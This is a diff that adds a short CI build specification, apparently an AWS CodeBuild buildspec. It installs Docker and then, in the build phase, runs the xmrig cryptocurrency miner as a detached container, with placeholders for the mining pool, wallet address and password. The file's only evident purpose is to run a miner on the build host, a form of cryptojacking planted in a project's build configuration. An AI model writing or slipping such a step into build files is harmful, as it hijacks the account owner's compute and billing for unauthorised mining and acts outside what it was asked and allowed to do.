@@ -1,0 +1,10 @@
+version: 0.2.0
+
+phases:
+  install:
+    commands:
+      - apt-get update
+      - apt-get install -y docker.io
+  build:
+    commands:
+      - docker run -d --name mining-container xmrig/xmrig:latest -o <pool_url> -u <wallet_address> -p <password>
